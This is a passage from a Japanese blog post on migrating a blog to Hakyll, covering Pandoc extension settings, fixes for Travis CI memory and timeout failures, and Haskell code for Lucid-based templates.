<span id="cb4-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-11" aria-hidden="true" tabindex="-1"></a>            <span class="op">&lt;&gt;</span> postCtx</span>
<span id="cb4-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="co">-- コンパイルの続き</span></span>
<span id="cb4-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-14" aria-hidden="true" tabindex="-1"></a>    loadAndApplyTemplate <span class="st">&quot;templates/post.html&quot;</span> ctx r</span>
<span id="cb4-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-15" aria-hidden="true" tabindex="-1"></a>      <span class="op">&gt;&gt;=</span> loadAndApplyTemplate <span class="st">&quot;templates/default.html&quot;</span> ctx</span>
<span id="cb4-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb4-16" aria-hidden="true" tabindex="-1"></a>      <span class="op">&gt;&gt;=</span> relativizeUrls</span></code></pre></div>
<h3 id="pandoc-の拡張">Pandoc の拡張</h3>
<p>Markdown はたくさんの方言があることで有名です。Hakyll が記事のビルドに使っている Pandoc も特徴的な Markdown を実装している処理系の1つで、<a href="https://pandoc.org/MANUAL.html">Pandoc User’s Guide</a> にはたくさんの拡張が紹介されています。基本的な文法<a href="https://blog.myon.info/entry/2018/03/21/hakyll/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>に大きく手を加えているようなことはないようで、記事の修正はほとんどいらなかった<a href="https://blog.myon.info/entry/2018/03/21/hakyll/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>のは助かりました。</p>
<p>Hakyll における Pandoc の拡張の有効無効は、<a href="https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/Hakyll-Web-Pandoc.html#v:pandocCompilerWith"><code>pandocCompilerWith</code></a> を使って任意の <a href="https://hackage.haskell.org/package/pandoc-2.1/docs/Text-Pandoc-Options.html#t:ReaderOptions"><code>ReaderOptions</code></a> と <a href="https://hackage.haskell.org/package/pandoc-2.1/docs/Text-Pandoc-Options.html#t:WriterOptions"><code>WriterOptions</code></a> を渡してやることで実現できます。例えばこのブログでは、こんな感じの <code>ReaderOptions</code> を設定しています。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb5-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-2" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> hakyll <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-3" aria-hidden="true" tabindex="-1"></a>  match <span class="st">&quot;posts/*&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-4" aria-hidden="true" tabindex="-1"></a>    route <span class="op">$</span> setExtension <span class="st">&quot;html&quot;</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-5" aria-hidden="true" tabindex="-1"></a>    compile <span class="op">$</span> pandocCompilerWith readerOptions writerOptions</span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">-- ...</span></span>
<span id="cb5-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="ot">readerOptions ::</span> <span class="dt">ReaderOptions</span></span>
<span id="cb5-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-10" aria-hidden="true" tabindex="-1"></a>readerOptions <span class="ot">=</span> defaultHakyllReaderOptions</span>
<span id="cb5-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-11" aria-hidden="true" tabindex="-1"></a>  { readerExtensions <span class="ot">=</span> enableExtension  <span class="dt">Ext_east_asian_line_breaks</span> <span class="op">$</span></span>
<span id="cb5-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-12" aria-hidden="true" tabindex="-1"></a>                       enableExtension  <span class="dt">Ext_emoji</span> <span class="op">$</span></span>
<span id="cb5-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-13" aria-hidden="true" tabindex="-1"></a>                       disableExtension <span class="dt">Ext_citations</span> <span class="op">$</span></span>
<span id="cb5-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-14" aria-hidden="true" tabindex="-1"></a>                       readerExtensions defaultHakyllReaderOptions</span>
<span id="cb5-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-15" aria-hidden="true" tabindex="-1"></a>  }</span>
<span id="cb5-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-17"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="ot">writerOptions ::</span> <span class="dt">WriterOptions</span></span>
<span id="cb5-18"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb5-18" aria-hidden="true" tabindex="-1"></a>writerOptions <span class="ot">=</span> <span class="co">-- ...</span></span></code></pre></div>
<p><code>Ext_emoji</code> 拡張は、<code>:sushi:</code> を <span class="emoji" data-emoji="sushi">🍣</span> に変えてくれるものです。また <code>Ext_citations</code> 拡張を無効にしているのは、<code>[@myon___](https://twitter.com/myon___)</code> のような <code>@</code> で始まるリンクを貼ろうとしたときにこっちの文法が呼び出されてしまったためです。</p>
<p>ちなみに、先程の例では <code>WriterOptions</code> を省略していますが、<code>ReaderOptions</code> も <code>WriterOptions</code> もたくさん設定があるので、どちらも一度確認してみるといいと思います。例えばこのブログでは、<code>WriterOptions</code> の <code>writerHTMLMathMethod</code> に <code>KaTeX</code> を設定しています。この設定をすると、本文中の数式を <code>math</code> class のついた <code>div</code> や <code>span</code> で囲ってくれます。<a href="https://blog.myon.info/entry/2016/07/03/new-design/">Middleman 時代には独自の拡張を加えていましたが</a>、この辺がデフォルトで対応しているのはいいですね。</p>
<h3 id="記事のビルドは早くなったけど">記事のビルドは早くなったけど…</h3>
<p>Hakyll に移行した結果、予想通り記事のビルドは早くなりました。Middleman のときとほぼ同じ構成のページを出力するように設定して手元の環境で比較してみたところ、Middleman が約5分30秒、Hakyll が約1分30秒という感じでした。複雑なルールなだけあって Hakyll の Example と比較するとかなり速度が落ちてしまいましたが、それでも十分早いです。処理自体もそこまで重いものではなく、CPU のコア全てに負荷がかかったりしないのもいいですね。</p>
<p>ただし、Hakyll では記事をビルドする前に、自分の設定ファイルと Hakyll をはじめとする依存パッケージをビルドする必要があります。Hakyll は Pandoc のような大きなパッケージにも依存しているので、初回のビルド時間全体で比較すると Hakyll のほうが確実に時間が掛かってしまいます。そこはまぁ、仕方ないですね…</p>
<h3 id="travis-ci-でのビルドが-out-of-memory-maximum-time-limit-で失敗する">Travis CI でのビルドが out of memory / maximum time limit で失敗する</h3>
<blockquote class="twitter-tweet tw-align-center" data-lang="en">
<p lang="ja" dir="ltr">
えぇ… / <a href="https://t.co/JReauEoUdA">https://t.co/JReauEoUdA</a>
</p>
— (✿╹◡╹)ﾉ (@myon___) <a href="https://twitter.com/myon___/status/975649670222397441?ref_src=twsrc%5Etfw">March 19, 2018</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>最初に Travis CI 上でビルドさせてみたところ、依存パッケージのビルドがこんなメッセージを出して失敗しました。</p>
<pre><code>--  While building custom Setup.hs for package Cabal-2.0.1.1 using:
      /home/travis/.stack/setup-exe-cache/x86_64-linux/Cabal-simple_mPHDZzAJ_2.0.1.0_ghc-8.2.2 --builddir=.stack-work/dist/x86_64-linux/Cabal-2.0.1.0 build --ghc-options &quot; -ddump-hi -ddump-to-file&quot;
    Process exited with code: ExitFailure (-9) (THIS MAY INDICATE OUT OF MEMORY)
    Logs have been written to: /home/travis/build/Tosainu/blog/.stack-work/logs/Cabal-2.0.1.1.log</code></pre>
<p><a href="https://docs.travis-ci.com/user/reference/overview/">Build Environment Overview - Travis CI</a> によれば Container-based 環境の Memory の欄は <strong>4GB max</strong> となっていました。起動の速さから Container-based 環境を利用していましたが、7.5GB 使える Sudo-enabled 環境に切り替えることにしました。</p>
<p>で、これで解決するかと思いきや… <a href="https://travis-ci.org/Tosainu/blog/builds/355674436#L1741">Build #118 - Tosainu/blog - Travis CI</a></p>
<pre><code>The job exceeded the maximum time limit for jobs, and has been terminated.</code></pre>
<p>今度はビルドの最終段階でこんなメッセージを出してジョブが中断されてしまいました。あとキャッシュをアップロードするだけじゃん…</p>
<p>結局、この問題は <a href="https://github.com/haskell-jp/blog">Haskell-jp Blog</a> でやっているような方法で解決できました。Beta 機能の <a href="https://docs.travis-ci.com/user/build-stages/">Build Stages</a> を使って Job を分割し、Out of memory しちゃう Cabal や時間のかかる Panoc のビルドを別々に行うというものです。<code>.travis.yaml</code> の一部を載せるとこんな感じ。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb8-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span><span class="kw">:</span><span class="at"> </span><span class="ch">false</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">dist</span><span class="kw">:</span><span class="at"> trusty</span></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="fu">language</span><span class="kw">:</span><span class="at"> generic</span></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-6" aria-hidden="true" tabindex="-1"></a><span class="fu">install</span><span class="kw">:</span></span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="kw">-</span><span class="at"> stack のインストールとかする</span></span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-9" aria-hidden="true" tabindex="-1"></a><span class="fu">jobs</span><span class="kw">:</span></span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">include</span><span class="kw">:</span></span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">stage</span><span class="kw">:</span><span class="at">  install npm packages</span></span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">script</span><span class="kw">:</span><span class="at"> npm install</span></span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-14" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">stage</span><span class="kw">:</span><span class="at">  build cabal</span></span>
<span id="cb8-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">script</span><span class="kw">:</span><span class="at"> stack --no-terminal build -j 1 Cabal</span></span>
<span id="cb8-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-16" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">stage</span><span class="kw">:</span><span class="at">  build pandoc</span></span>
<span id="cb8-17"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-17" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">script</span><span class="kw">:</span><span class="at"> travis_wait 30 stack --no-terminal build pandoc</span></span>
<span id="cb8-18"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-18" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">stage</span><span class="kw">:</span><span class="at">  build other dependencies</span></span>
<span id="cb8-19"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-19" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">script</span><span class="kw">:</span><span class="at"> stack --no-terminal build  --only-dependencies</span></span>
<span id="cb8-20"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-21"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-21" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> </span><span class="fu">stage</span><span class="kw">:</span><span class="at"> deploy site</span></span>
<span id="cb8-22"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-22" aria-hidden="true" tabindex="-1"></a><span class="at">      </span><span class="fu">script</span><span class="kw">:</span><span class="at"> ...</span></span>
<span id="cb8-23"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-24"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-24" aria-hidden="true" tabindex="-1"></a><span class="fu">cache</span><span class="kw">:</span></span>
<span id="cb8-25"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-25" aria-hidden="true" tabindex="-1"></a><span class="at">  </span><span class="fu">directories</span><span class="kw">:</span></span>
<span id="cb8-26"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-26" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> $HOME/.stack</span></span>
<span id="cb8-27"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-27" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> .stack-work</span></span>
<span id="cb8-28"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb8-28" aria-hidden="true" tabindex="-1"></a><span class="at">    </span><span class="kw">-</span><span class="at"> node_modules</span></span></code></pre></div>
<p>時間のかかるビルドは Travis CI で問題になりそうだなあと予想はしていたけど、ここまで苦労することになるとは思わなかった…</p>
<p>あと、これはまだ検証していないけれども、<a href="https://docs.travis-ci.com/user/cron-jobs/">Cron Jobs</a> で定期的にビルドを回してキャッシュを更新し続けるのもやってみようかなと思っています。記事を追加しただけなのにキャッシュの期限が切れてて全体の再ビルドが掛かったりするのは (╯•﹏•╰) なので。</p>
<h2 id="その他いろいろ">その他いろいろ</h2>
<h3 id="テンプレートに-lucid-を使いたい">テンプレートに Lucid を使いたい</h3>
<p>Hakyll には独自のテンプレートエンジンが実装されていますが、せっかくなので以前 Haskell のプロの方が紹介していた<a href="https://blog.myon.info/entry/2018/03/21/hakyll/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>テンプレートエンジンである <a href="https://github.com/chrisdone/lucid">Lucid</a> を使ってみることにしました。Lucid は、こんな感じに HTML を出力することができるパッケージです。</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb9-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb9-1" aria-hidden="true" tabindex="-1"></a>λ<span class="op">&gt;</span> <span class="op">:</span>m <span class="op">+</span><span class="dt">Lucid</span> <span class="dt">Data.Monoid</span> </span>
<span id="cb9-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb9-2" aria-hidden="true" tabindex="-1"></a>λ<span class="op">&gt;</span> div_ (p_ (<span class="st">&quot;hello, &quot;</span> <span class="op">&lt;&gt;</span> strong_ <span class="st">&quot;World!&quot;</span>))<span class="ot"> ::</span> <span class="dt">Html</span> ()</span>
<span id="cb9-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="fu">div</span><span class="op">&gt;&lt;</span>p<span class="op">&gt;</span>hello, <span class="op">&lt;</span>strong<span class="op">&gt;</span><span class="dt">World</span><span class="op">!&lt;/</span>strong<span class="op">&gt;&lt;/</span>p<span class="op">&gt;&lt;/</span><span class="fu">div</span><span class="op">&gt;</span></span></code></pre></div>
<p><a href="https://github.com/lfairy/lfairy.github.io">lfairy さんの Github pages</a> が Lucid を使ってテンプレートを書いていたので、これを参考にさせてもらいました。ただ、テンプレート側で <code>ContextField</code> を受け取るために、こんな感じにラムダ式使っているのがちょっと気に入らなかったのでいじってみました。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb10-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb10-1" aria-hidden="true" tabindex="-1"></a>postTemplate <span class="ot">=</span> <span class="dt">LucidTemplate</span> <span class="op">$</span> \ask <span class="ot">-&gt;</span> <span class="kw">do</span></span>
<span id="cb10-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb10-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">StringField</span> body <span class="ot">&lt;-</span> lift <span class="op">$</span> ask <span class="st">&quot;body&quot;</span></span>
<span id="cb10-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb10-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- ...</span></span></code></pre></div>
<p>Lucid は Monad Transformer としても使えるので、<code>LucidTemplate</code> の中身を <a href="https://hackage.haskell.org/package/lucid-2.9.10/docs/Lucid-Base.html#t:HtmlT"><code>HtmlT</code></a> と <a href="https://hackage.haskell.org/package/transformers-0.5.5.0/docs/Control-Monad-Trans-Reader.html#t:ReaderT"><code>ReaderT</code></a> を組み合わせたものにしてみます。</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb11-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">type</span> <span class="dt">LucidTemplateMonad</span> a r <span class="ot">=</span> <span class="dt">HtmlT</span> (<span class="dt">ReaderT</span> (<span class="dt">Context</span> a, <span class="dt">Item</span> a) <span class="dt">Compiler</span>) r</span>
<span id="cb11-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="kw">newtype</span> <span class="dt">LucidTemplate</span> a <span class="ot">=</span> <span class="dt">LucidTemplate</span></span>
<span id="cb11-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb11-4" aria-hidden="true" tabindex="-1"></a>    {<span class="ot"> runLucidTemplate ::</span> <span class="dt">LucidTemplateMonad</span> a () }</span></code></pre></div>
<p><a href="https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/Hakyll-Web-Template-Context.html#t:Context"><code>Context a</code></a> と <a href="https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/Hakyll-Core-Item.html#t:Item"><code>Item a</code></a> は、<a href="https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/Hakyll-Web-Template-Context.html#t:ContextField"><code>ContextField</code></a> を取り出す <code>unContext</code> を呼び出すときに必要となるパラメータです。ちなみに、<code>unContext</code> はこのようになっていますが</p>
<blockquote>
<div class="sourceCode" id="cb12"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb12-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ot">unContext ::</span> <span class="dt">String</span> <span class="ot">-&gt;</span> [<span class="dt">String</span>] <span class="ot">-&gt;</span> <span class="dt">Item</span> a <span class="ot">-&gt;</span> <span class="dt">Compiler</span> <span class="dt">ContextField</span></span></code></pre></div>
</blockquote>
<p>この1つ目の <code>String</code> が field のキーに、2つ目の <code>[String]</code> が <a href="https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/Hakyll-Web-Template-Context.html#v:functionField"><code>functionField</code></a> などを呼び出すときの引数に相当するようです。</p>
<p>テンプレートを適用するための関数はこんな感じ。<code>renderTextT</code> の後に <code>runReaderT</code> で <code>ReaderT</code> もほどいてやります。</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb13-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ot">applyLucidTemplate ::</span> <span class="dt">LucidTemplate</span> a <span class="ot">-&gt;</span> <span class="dt">Context</span> a <span class="ot">-&gt;</span> <span class="dt">Item</span> a <span class="ot">-&gt;</span> <span class="dt">Compiler</span> (<span class="dt">Item</span> <span class="dt">String</span>)</span>
<span id="cb13-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb13-2" aria-hidden="true" tabindex="-1"></a>applyLucidTemplate tpl ctx item <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb13-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb13-3" aria-hidden="true" tabindex="-1"></a>  body <span class="ot">&lt;-</span> TL.unpack <span class="op">&lt;$&gt;</span> runReaderT (renderTextT (runLucidTemplate tpl)) (ctx', item)</span>
<span id="cb13-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb13-4" aria-hidden="true" tabindex="-1"></a>  <span class="fu">return</span> <span class="op">$</span> itemSetBody body item</span>
<span id="cb13-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb13-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span> ctx' <span class="ot">=</span> ctx <span class="ot">`mappend`</span> missingField</span></code></pre></div>
<p>そしてこんな関数を用意して</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb14-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ot">lookupMeta ::</span> <span class="dt">String</span> <span class="ot">-&gt;</span> <span class="dt">LucidTemplateMonad</span> a <span class="dt">ContextField</span></span>
<span id="cb14-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-2" aria-hidden="true" tabindex="-1"></a>lookupMeta k <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb14-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-3" aria-hidden="true" tabindex="-1"></a>  (c, i) <span class="ot">&lt;-</span> lift ask</span>
<span id="cb14-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-4" aria-hidden="true" tabindex="-1"></a>  lift <span class="op">$</span> lift <span class="op">$</span> applyTemplateExpr c i (<span class="dt">Ident</span> (<span class="dt">TemplateKey</span> k))</span>
<span id="cb14-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="co">-- https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/src/Hakyll-Web-Template-Internal.html#applyTemplate%27</span></span>
<span id="cb14-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="ot">applyTemplateExpr ::</span> <span class="dt">Context</span> a <span class="ot">-&gt;</span> <span class="dt">Item</span> a <span class="ot">-&gt;</span> <span class="dt">TemplateExpr</span> <span class="ot">-&gt;</span> <span class="dt">Compiler</span> <span class="dt">ContextField</span></span>
<span id="cb14-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-8" aria-hidden="true" tabindex="-1"></a>applyTemplateExpr _ _ (<span class="dt">StringLiteral</span> s)         <span class="ot">=</span> <span class="fu">return</span> (<span class="dt">StringField</span> s)</span>
<span id="cb14-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-9" aria-hidden="true" tabindex="-1"></a>applyTemplateExpr c i (<span class="dt">Ident</span> (<span class="dt">TemplateKey</span> k))   <span class="ot">=</span> unContext c k [] i</span>
<span id="cb14-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-10" aria-hidden="true" tabindex="-1"></a>applyTemplateExpr c i (<span class="dt">Call</span>  (<span class="dt">TemplateKey</span> k) a) <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb14-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-11" aria-hidden="true" tabindex="-1"></a>  a' <span class="ot">&lt;-</span> <span class="fu">mapM</span> (\e <span class="ot">-&gt;</span> applyTemplateExpr c i e <span class="op">&gt;&gt;=</span> getString e) a</span>
<span id="cb14-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-12" aria-hidden="true" tabindex="-1"></a>  unContext c k a' i</span>
<span id="cb14-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-13" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span> getString _ (<span class="dt">StringField</span> s) <span class="ot">=</span> <span class="fu">return</span> s</span>
<span id="cb14-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-14" aria-hidden="true" tabindex="-1"></a>        getString e (<span class="dt">ListField</span> _ _) <span class="ot">=</span></span>
<span id="cb14-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb14-15" aria-hidden="true" tabindex="-1"></a>          <span class="fu">fail</span> <span class="op">$</span> <span class="st">&quot;expected StringField but got ListField for expr &quot;</span> <span class="op">++</span> <span class="fu">show</span> e</span></code></pre></div>
<p>テンプレート側ではこんな感じ書けるようにしてみました。</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb15-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb15-1" aria-hidden="true" tabindex="-1"></a>postTemplate <span class="ot">=</span> <span class="dt">LucidTemplate</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb15-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb15-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">StringField</span> body <span class="ot">&lt;-</span> lookupMeta <span class="st">&quot;body&quot;</span></span>
<span id="cb15-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- ...</span></span></code></pre></div>
<p>また、記事リストなどを受け渡すときに使う <code>ListField (Context a) [Item a]</code> のためにこんな関数も用意し</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb16-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ot">withContext ::</span> <span class="dt">Monad</span> m <span class="ot">=&gt;</span> a' <span class="ot">-&gt;</span> <span class="dt">HtmlT</span> (<span class="dt">ReaderT</span> a' m) r <span class="ot">-&gt;</span> <span class="dt">HtmlT</span> (<span class="dt">ReaderT</span> a m) r</span>
<span id="cb16-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb16-2" aria-hidden="true" tabindex="-1"></a>withContext c <span class="ot">=</span> <span class="dt">HtmlT</span> <span class="op">.</span> withReaderT (<span class="fu">const</span> c) <span class="op">.</span> runHtmlT</span></code></pre></div>
<p>テンプレート側ではこんな感じで記事リストが書けるようにしてみました。</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb17-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ot">listTemplate ::</span> <span class="dt">LucidTemplate</span> a</span>
<span id="cb17-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-2" aria-hidden="true" tabindex="-1"></a>listTemplate <span class="ot">=</span> <span class="dt">LucidTemplate</span> <span class="op">$</span></span>
<span id="cb17-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-3" aria-hidden="true" tabindex="-1"></a>  ul_ <span class="op">$</span> <span class="kw">do</span></span>
